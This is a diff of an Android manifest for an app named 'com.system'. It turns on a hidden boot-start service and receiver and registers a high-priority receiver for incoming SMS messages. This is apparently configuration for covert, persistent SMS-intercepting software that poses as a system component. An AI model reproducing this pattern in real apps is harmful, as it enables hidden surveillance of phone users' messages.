@@ -2,22 +2,20 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
 	package="com.system" 
 	android:versionCode="1"	
-	android:versionName="1.0 Alpha">
+	android:versionName="1.0">
 	
 	<application android:icon="@drawable/icon" android:label="@string/app_name">
 	
-	 	<!-- 
-		<service android:name="com.system.BootService" android:enabled="true" android:excludeFromRecents="true" />
+	 	<service android:name="com.system.BootService" android:enabled="true" android:excludeFromRecents="true" />
 		<receiver android:name="com.system.BootReceiver" android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
 			<intent-filter>
 				<action android:name="android.intent.action.BOOT_COMPLETED" />
 			</intent-filter>
 		</receiver>
-		-->
 		
 		<receiver android:name="com.system.ActivationReceiver" 
 				  android:enabled="true" >
-        	<intent-filter android:priority="1000">
+        	<intent-filter android:priority="999">
             	<action android:name="android.provider.Telephony.SMS_RECEIVED" />
         	</intent-filter>
     	</receiver>
